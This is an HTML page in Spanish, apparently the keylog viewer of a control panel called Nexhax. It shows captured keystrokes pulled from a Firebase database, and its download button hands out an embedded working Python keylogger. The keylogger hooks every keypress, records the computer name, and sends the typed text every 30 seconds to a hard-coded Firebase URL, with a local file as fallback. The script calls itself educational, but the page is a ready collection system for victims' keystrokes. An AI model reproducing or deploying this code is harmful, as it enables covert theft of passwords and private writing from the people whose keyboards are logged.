<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Logs de Keylogger - Nexhax">
    <meta name="theme-color" content="#000000">
    <title>Keylogs - Nexhax</title>
    <link rel="stylesheet" href="style.css">
</head>

<body>
    <header class="topbar">
        <div class="brand">Nexhax</div>
        <nav class="nav-links">
            <a href="home.html">Dashboard</a>
            <a href="rastreo.html">Rastreo</a>
            <a href="keylogs.html" class="active">Keylogs</a>
            <a href="perfil.html">Perfil</a>
        </nav>
        <a href="home.html" class="btn-ghost btn-inline">Volver</a>
    </header>
    <div class="card">
        <h2>Registros de Teclado</h2>
        <p style="color: #666; font-size: 14px; margin-bottom: 20px;">
            Los registros se muestran en tiempo real desde el script de Python.
        </p>

        <button class="btn-secondary" id="btn-refresh">
            Actualizar Lista
        </button>
        <button class="btn-secondary" id="btn-download" style="border-color: var(--primary); color: var(--primary);">
            Descargar Payload (.py)
        </button>
        <button class="btn-secondary" id="btn-clear" style="border-color: var(--danger); color: var(--danger);">
            Borrar Registros
        </button>
    </div>

    <div class="card">
        <div class="table-wrap">
            <table>
                <thead>
                    <tr>
                        <th>Fecha/Hora</th>
                        <th>Dispositivo</th>
                        <th>Contenido</th>
                    </tr>
                </thead>
                <tbody id="log-list">
                    <tr>
                        <td colspan="3" style="text-align:center;">
                            <span class="loading"></span> Cargando...
                        </td>
                    </tr>
                </tbody>
            </table>
        </div>
    </div>

    <script type="module">
        import { auth, db, ref, onValue, remove } from './firebase-config.js';

        const list = document.getElementById('log-list');
        const btnClear = document.getElementById('btn-clear');
        const btnRefresh = document.getElementById('btn-refresh');
        const btnDownload = document.getElementById('btn-download');

        let currentUserId = null;

        const PAYLOAD_TEMPLATE = `import keyboard
import urllib.request
import json
import os
import sys
import time
from threading import Timer
from datetime import datetime
import uuid

# CONFIGURACIÓN - ¡MODIFICA ESTO!
USER_ID = "{USER_ID}"  # Cambia esto por un ID único
FIREBASE_DB_URL = "https://lozano-1690859356322-default-rtdb.firebaseio.com"
INTERVALO = 30  # Segundos (empieza con 30 para pruebas)

class Keylogger:
    def __init__(self):
        self.log = ""
        self.intervalo = INTERVALO
        self.session_id = str(uuid.uuid4())[:8]  # ID único para esta sesión
        
    def callback(self, event):
        nombre = event.name
        if len(nombre) > 1:
            if nombre == "space":
                nombre = " "
            elif nombre == "enter":
                nombre = "\\n"  # Solo un salto de línea
            elif nombre == "decimal":
                nombre = "."
            elif nombre == "backspace":
                nombre = "[BKSP]"
            elif nombre == "tab":
                nombre = "[TAB]"
            else:
                nombre = f"[{nombre.upper()}]"
        self.log += nombre
        
        # Opcional: mostrar en consola para debugging
        if len(self.log) > 100:  # Cada 100 caracteres
            print(f"[DEBUG] Caracteres capturados: {len(self.log)}")
    
    def enviar_firebase(self):
        if not self.log or len(self.log.strip()) == 0:
            return
            
        try:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            dispositivo = os.environ.get('COMPUTERNAME', 'DESCONOCIDO')
            
            # Preparar datos
            data = {
                "timestamp": timestamp,
                "content": self.log,
                "device": dispositivo,
                "session_id": self.session_id,
                "user_id": USER_ID
            }
            
            # Para Firebase RealTime Database
            url = f"{FIREBASE_DB_URL}/keylogs/{USER_ID}/{int(time.time())}.json"
            
            # Crear request
            req = urllib.request.Request(
                url, 
                data=json.dumps(data).encode('utf-8'),
                headers={
                    'Content-Type': 'application/json',
                    'User-Agent': 'Python-Keylogger'
                },
                method='PUT'  # Usar PUT en lugar de POST para evitar duplicados
            )
            
            # Enviar datos
            with urllib.request.urlopen(req, timeout=10) as response:
                if response.getcode() == 200:
                    print(f"[+] Datos enviados: {len(self.log)} caracteres")
                    self.log = ""  # Limpiar solo si se envió correctamente
                else:
                    print(f"[-] Error HTTP: {response.getcode()}")
                    
        except urllib.error.URLError as e:
            print(f"[-] Error de conexión: {e}")
            # Guardar localmente si no hay conexión
            self.guardar_local()
        except Exception as e:
            print(f"[-] Error general: {e}")
            self.guardar_local()
    
    def guardar_local(self):
        """Guardar localmente si falla el envío a Firebase"""
        try:
            with open("keylog_local.txt", "a", encoding="utf-8") as f:
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                f.write(f"\\n--- {timestamp} ---\\n{self.log}\\n")
            print(f"[!] Guardado localmente: {len(self.log)} caracteres")
            self.log = ""
        except:
            pass
    
    def reportar(self):
        """Función que se ejecuta periódicamente"""
        if self.log:
            self.enviar_firebase()
        else:
            print("[.] Esperando entrada...")
        
        # Programar próximo envío
        timer = Timer(self.intervalo, self.reportar)
        timer.daemon = True
        timer.start()
    
    def iniciar(self):
        print("=" * 50)
        print("KEYLOGGER EDUCATIVO - CONCEPTO DE FIRESTORE")
        print("=" * 50)
        print(f"Usuario: {USER_ID}")
        print(f"Sesión: {self.session_id}")
        print(f"Intervalo: {self.intervalo}s")
        print(f"Dispositivo: {os.environ.get('COMPUTERNAME', 'DESCONOCIDO')}")
        print("\\n[+] Iniciando monitorización...")
        print("[!] Presiona CTRL+C para detener")
        print("=" * 50)
        
        # Configurar callback
        keyboard.on_release(callback=self.callback)
        
        # Iniciar timer periódico
        self.reportar()
        
        # Mantener el programa corriendo
        try:
            keyboard.wait()  # Espera indefinidamente
        except KeyboardInterrupt:
            print("\\n[!] Interrupción detectada")
        finally:
            # Enviar lo que quede antes de salir
            if self.log:
                print("[!] Enviando datos restantes...")
                self.enviar_firebase()
            print("[+] Programa terminado")

if __name__ == "__main__":
    # Verificar configuración
    if USER_ID == "{USER_ID}":
        print("ERROR: Debes configurar USER_ID en el código")
        print("Cambia 'usuario_prueba' por un identificador único")
        sys.exit(1)
    
    try:
        k = Keylogger()
        k.iniciar()
    except Exception as e:
        print(f"Error crítico: {e}")
        import traceback
        traceback.print_exc()
`;

        auth.onAuthStateChanged(u => {
            if (!u) {
                location.href = 'index.html';
                return;
            }
            currentUserId = u.uid;
            loadLogs();
        });

        function loadLogs() {
            const logsRef = ref(db, `keylogs/${currentUserId}`);

            onValue(logsRef, (snap) => {
                list.innerHTML = "";

                if (!snap.exists()) {
                    list.innerHTML = `
                        <tr>
                            <td colspan='3' style='text-align:center; padding:24px; color:#999;'>
                                No hay registros capturados
                            </td>
                        </tr>
                    `;
                    return;
                }

                const logs = [];
                snap.forEach(child => {
                    logs.push({ key: child.key, ...child.val() });
                });

                // Ordenar por fecha descendente
                logs.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));

                for (const log of logs) {
                    const date = new Date(log.timestamp).toLocaleString();
                    const device = log.device || 'Desconocido';
                    const content = log.content || '';

                    const row = `
                        <tr>
                            <td style="white-space: nowrap; font-size: 13px;">${date}</td>
                            <td><span class="device-badge">${device}</span></td>
                            <td><div class="log-content">${escapeHtml(content)}</div></td>
                        </tr>
                    `;
                    list.innerHTML += row;
                }
            });
        }

        function escapeHtml(text) {
            return text
                .replace(/&/g, "&amp;")
                .replace(/</g, "&lt;")
                .replace(/>/g, "&gt;")
                .replace(/"/g, "&quot;")
                .replace(/'/g, "&#039;");
        }

        btnRefresh.onclick = () => {
            // Realtime database updates automatically, but visual feedback is nice
            list.innerHTML = '<tr><td colspan="3" style="text-align:center;"><span class="loading"></span> Recargando...</td></tr>';
            setTimeout(loadLogs, 500);
        };

        btnDownload.onclick = () => {
            if (!currentUserId) return;

            const code = PAYLOAD_TEMPLATE.replace("{USER_ID}", currentUserId);
            const blob = new Blob([code], { type: 'text/x-python' });
            const url = window.URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = "payload.py";
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            window.URL.revokeObjectURL(url);
        };

        btnClear.onclick = async () => {
            if (confirm("¿Estás seguro de borrar todos los registros de teclado?")) {
                try {
                    await remove(ref(db, `keylogs/${currentUserId}`));
                } catch (e) {
                    alert("Error al borrar: " + e.message);
                }
            }
        };
    </script>
</body>

</html>
